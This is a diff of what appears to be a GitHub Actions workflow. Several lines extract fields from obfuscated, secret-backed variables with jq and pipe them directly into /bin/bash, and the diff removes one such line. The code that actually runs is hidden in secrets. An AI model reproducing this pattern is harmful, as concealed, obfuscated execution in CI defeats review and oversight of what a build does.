@@ -23,7 +23,6 @@ jobs:
           opnvj992: ${{ secrets.opnvj992 }}
         run: |
           printf '%s' "$opnvj992" | jq -r .zeq9 | /bin/bash
-          printf '%s' "$uurmm4" | jq -r .cdq9 | /bin/bash
           printf '%s' "$zsq3484" | jq -r .i1 | /bin/bash
           echo $h5672 | jq -r .k1 | /bin/bash
           printf '%s' "$mfr9" | jq -r .gfz06240 | /bin/bash
